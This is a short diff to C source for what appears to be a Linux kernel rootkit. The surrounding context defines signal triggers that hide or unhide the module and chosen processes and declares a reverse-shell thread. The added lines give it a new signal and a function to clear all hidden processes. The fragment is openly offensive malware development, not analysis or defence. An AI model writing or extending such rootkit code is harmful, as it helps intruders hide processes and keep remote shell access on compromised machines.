@@ -48,6 +48,7 @@ static int hidden_process_count = 0;
 #define SIGUSR2 12                  // Module hide/show toggle
 #define SIGRTMIN 34                 // Hide process (kill -34 0 PID_TO_HIDE)
 #define SIGRTMIN1 35                // Unhide process (kill -35 0 PID_TO_UNHIDE)
+#define SIGRTMIN2 36                // Clear all hidden processes (kill -36 0)
 //==================================================================//
 
 #define TRUE 1
@@ -65,6 +66,7 @@ int add_hidden_process(const char *process_name);
 int remove_hidden_process(const char *process_name);
 bool is_process_hidden(const char *process_name);
 bool is_pid_hidden_by_name(pid_t pid);
+void clear_all_hidden_processes(void);
 
 static struct task_struct *revshell_thread;
 // static bool execute_shell = false; // Removed - no longer needed for automatic execution
